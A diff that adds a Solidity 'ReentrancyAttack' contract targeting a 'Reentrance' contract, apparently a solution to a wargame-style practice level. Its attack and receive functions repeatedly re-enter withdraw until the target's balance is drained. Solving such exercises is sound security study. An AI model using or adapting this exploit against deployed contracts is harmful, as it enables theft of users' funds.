@@ -28,3 +28,24 @@ contract Reentrance {
 
     receive() external payable {}
 }
+
+contract ReentrancyAttack {
+    Reentrance public reentrancy;
+    uint256 public attackAmount;
+
+    constructor(address payable _reentrancy) payable public {
+        reentrancy = Reentrance(_reentrancy);
+    }
+
+    function attack() external payable {
+        attackAmount = msg.value;
+        reentrancy.donate{value: msg.value}(address(this));
+        reentrancy.withdraw(msg.value);
+    }
+
+    receive() external payable {
+        if (address(reentrancy).balance > 0) {
+            reentrancy.withdraw(attackAmount);
+        }
+    }
+}
